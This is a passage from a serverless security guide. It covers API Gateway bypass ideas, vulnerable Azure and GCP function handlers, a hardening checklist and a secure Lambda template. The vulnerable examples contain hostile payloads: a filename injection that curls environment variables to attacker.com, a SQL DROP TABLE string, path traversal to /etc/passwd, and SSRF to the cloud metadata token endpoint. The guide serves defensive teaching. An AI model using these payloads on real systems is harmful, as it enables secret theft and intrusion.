# Attack 2: Exploit request validation gaps
# API Gateway request validation only checks the body structure
# If the Lambda processes different parameters than what's validated,
# injection is possible

# Example: API Gateway validates query parameters but not body
# POST /api/users?name=validated_name
# Body: {"name": "injected_name"}  ← not validated

# Attack 3: Exploit Authorizer Lambda
# If the custom authorizer has vulnerabilities:
# - SQL injection in authorizer code
# - SSRF if authorizer makes HTTP requests
# - Excessive caching of authorizer results

# Attack 4: API Gateway resource policy bypass
# If the resource policy allows specific IPs or VPC endpoints,
# an attacker may be able to bypass the restriction via:
# - X-Forwarded-For header injection
# - VPN or proxy to allowed IP ranges
# - VPC endpoint access from compromised account
```

---

## 10. Event Injection Across Cloud Providers

### 10.1 Cross-Provider Event Injection Comparison

| Attack Vector | AWS Lambda | Azure Functions | GCP Cloud Functions |
|---|---|---|---|
| **HTTP trigger** | API Gateway | HTTP Trigger | HTTP Trigger |
| **Storage events** | S3, SNS, SQS | Blob, Queue | Cloud Storage, Pub/Sub |
| **Database events** | DynamoDB Streams | Cosmos DB Change Feed | Firestore Events |
| **Auth events** | Cognito triggers | Easy Auth | Firebase Auth |
| **Schedule events** | CloudWatch Events | Timer Trigger | Cloud Scheduler |
| **IoT events** | IoT Core Rules | IoT Hub | Cloud IoT |

### 10.2 Azure Functions Event Injection

```csharp
// Azure Function triggered by Blob Storage
// VULNERABLE: Processing blob metadata without validation

public static async Task Run(
    [BlobTrigger("uploads/{name}")] Stream blobStream,
    string name,
    IDictionary<string, string> metadata,
    ILogger log)
{
    // DANGEROUS: Using blob name in SQL query
    var sqlCommand = $"SELECT * FROM files WHERE name = '{name}'";
    // SQL injection via blob name: "'; DROP TABLE files; --"

    // DANGEROUS: Using metadata in file operations
    var outputPath = $"/output/{metadata["destination"]}";
    // Path traversal: metadata["destination"] = "../../etc/passwd"

    // DANGEROUS: Processing blob content as executable
    var content = new StreamReader(blobStream).ReadToEnd();
    // If content is deserialized or executed, it's RCE
    
    // DANGEROUS: Managed identity token exposure
    // Azure Functions have a managed identity that can be accessed via:
    var token = await new AzureServiceTokenProvider()
        .GetAccessTokenAsync("https://storage.azure.com/");
    // If this token is exfiltrated, attacker can access storage
}
```

### 10.3 GCP Cloud Functions Event Injection

```python
# GCP Cloud Function triggered by Cloud Storage
# VULNERABLE: Processing event data without validation

def cloud_function(event, context):
    """Triggered by a change to a Cloud Storage bucket."""
    
    # DANGEROUS: Using event data in shell commands
    file_name = event['name']
    bucket_name = event['bucket']
    
    # Command injection via filename
    import subprocess
    result = subprocess.run(
        f'gsutil cp gs://{bucket_name}/{file_name} /tmp/',
        shell=True,
        capture_output=True
    )
    # file_name = "; curl http://attacker.com/$(env | base64) ; echo "
    
    # DANGEROUS: Using metadata in HTTP requests (SSRF)
    metadata = event.get('metadata', {})
    target_url = metadata.get('callback_url', '')
    requests.post(target_url, data={'status': 'processed'})
    # metadata["callback_url"] = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
    
    # DANGEROUS: Service account token theft
    # Cloud Functions use a service account with potentially broad permissions
    import google.auth.transport.requests
    import google.oauth2.id_token
    
    # The function's service account token can be retrieved via metadata
    # If exfiltrated, it provides access to all GCP resources
    # the service account can access
```

---

## 11. Serverless Security Hardening

### 11.1 AWS Lambda Hardening Checklist

| Control | Implementation | Priority |
|---|---|---|
| **Least-privilege IAM role** | Create role with minimal permissions | Critical |
| **No secrets in env vars** | Use Secrets Manager or Parameter Store | Critical |
| **Input validation** | Validate all event source data | Critical |
| **Layer security** | Audit layers, pin versions | High |
| **VPC configuration** | Place in VPC with NAT + endpoints | High |
| **Dead letter queue** | Configure DLQ for failed invocations | Medium |
| **Concurrency limits** | Set reserved concurrency to prevent DoS | High |
| **Code signing** | Sign function code with Code Signing Config | High |
| **Runtime monitoring** | Enable Lambda Insights, X-Ray tracing | Medium |
| **Environment isolation** | Separate dev/staging/production functions | Medium |

### 11.2 Secure Lambda Function Template

```python
# Secure Lambda function template
import json
import os
import re
import hmac
import boto3
from botocore.exceptions import ClientError

# Input validation schema
INPUT_SCHEMA = {
    "type": "object",
    "properties": {
        "action": {"type": "string", "enum": ["process", "validate"]},
        "data": {"type": "string", "maxLength": 10000},
        "id": {"type": "string", "pattern": "^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$"}
    },
    "required": ["action", "data"],
    "additionalProperties": False
}

SECRETS_CLIENT = boto3.client('secretsmanager')

def get_secret(secret_name):
    """Retrieve secret from AWS Secrets Manager (not environment variables)"""
    try:
        response = SECRETS_CLIENT.get_secret_value(SecretId=secret_name)
        return response['SecretString']
    except ClientError as e:
        raise ValueError(f"Failed to retrieve secret: {e}")

def validate_input(event):
    """Validate all input from event sources"""
    # Validate structure
    if 'body' not in event:
        raise ValueError("Missing required field: body")
    
    try:
        data = json.loads(event['body']) if isinstance(event['body'], str) else event['body']
    except json.JSONDecodeError:
        raise ValueError("Invalid JSON in request body")
    
    # Validate against schema
    for key, rules in INPUT_SCHEMA['properties'].items():
        if key in data:
            if rules.get('maxLength') and len(str(data[key])) > rules['maxLength']:
                raise ValueError(f"Field {key} exceeds maximum length")
            if rules.get('pattern') and not re.match(rules['pattern'], str(data[key])):
                raise ValueError(f"Field {key} does not match required pattern")
    
    # Validate enum values
    if 'action' in data and data['action'] not in INPUT_SCHEMA['properties']['action']['enum']:
        raise ValueError(f"Invalid action: {data['action']}")
    
    return data

def lambda_handler(event, context):
    try:
        # Step 1: Validate input
        data = validate_input(event)
        
        # Step 2: Retrieve secrets securely
        db_password = get_secret('prod/database/password')
        
        # Step 3: Process with constant-time comparison for secrets
        # (No timing side channels)
        request_api_key = event.get('headers', {}).get('x-api-key', '')
        stored_api_key = get_secret('prod/api/key')
        if not hmac.compare_digest(request_api_key.encode(), stored_api_key.encode()):
            return {'statusCode': 401, 'body': json.dumps({'error': 'Unauthorized'})}
        
        # Step 4: Process data (no shell commands, no eval)
        result = process_data(data)
        
        # Step 5: Return sanitized response (no stack traces)
        return {'statusCode': 200, 'body': json.dumps({'result': result})}
        
    except ValueError as e:
        # Return generic error message (no implementation details)
        return {'statusCode': 400, 'body': json.dumps({'error': 'Invalid request'})}
    except Exception as e:
        # Log the error internally but return a generic message
        print(f"Error: {e}")  # CloudWatch Logs
        return {'statusCode': 500, 'body': json.dumps({'error': 'Internal error'})}

def process_data(data):
    # Business logic with no direct shell execution, no eval,
    # no pickle.loads, no yaml.load (use yaml.safe_load)
    return data['action'].upper()
```

### 11.3 Cross-Provider Security Comparison

| Security Feature | AWS Lambda | Azure Functions | GCP Cloud Functions |
|---|---|---|---|
| **Secrets management** | Secrets Manager / Parameter Store | Key Vault | Secret Manager |
| **IAM enforcement** | Execution role + resource policy | Managed identity + RBAC | Service account + IAM |
| **VPC isolation** | VPC + ENI | VNet Integration | VPC Connector |
| **Input validation** | Customer responsibility | Customer responsibility | Customer responsibility |
| **Cold start protection** | Provisioned concurrency | Premium plan | Min instances |
| **Concurrent execution limit** | Reserved concurrency | App plan limits | Max instances |
| **Network egress control** | Security groups + VPC endpoints | NSGs + VNet | VPC firewall rules |
| **Audit logging** | CloudTrail, X-Ray | App Insights, Monitor | Cloud Audit Logs |

**Cross-reference**: Serverless security directly depends on cloud IAM (see `01b_identity_access_management.md` for IAM privilege escalation paths) and cloud metadata service attacks (see `01a_cloud_architecture_security.md` for SSRF to metadata exploitation). The dependency confusion attack described here is a form of supply chain attack — see `supply_chain_security/docs/` for broader supply chain security coverage.

---

*Next: [03b — Infrastructure as Code Security](03b_infrastructure_as_code_security.md)*

---

## References

1. AWS. "Lambda Security Best Practices." *Amazon Web Services*. 2024. https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html
2. OWASP. "Serverless Security Project." *Open Worldwide Application Security Project*. 2024. https://owasp.org/www-project-serverless-top-10/
3. PureSec. "Serverless Security Top 10." *PureSec*. 2019. https://github.com/puresec/sas-top-10
4. Microsoft. "Azure Functions Security." *Microsoft Learn*. 2024. https://learn.microsoft.com/en-us/azure/azure-functions/security-baseline/
5. Google Cloud. "Cloud Functions Security." *Google Cloud*. 2024. https://cloud.google.com/functions/docs/securing
6. Rhino Security Labs. "AWS IAM Privilege Escalation Methods." *Rhino Security Labs*. 2019. https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
7. AWS. "Provisioned Concurrency." *Amazon Web Services*. 2024. https://docs.aws.amazon.com/lambda/latest/dg/provisioned-concurrency.html
8. NIST. "SP 800-204: Security Strategies for Microservices-based Application Systems." *National Institute of Standards and Technology*. August 2019. https://csrc.nist.gov/publications/detail/sp/800-204/final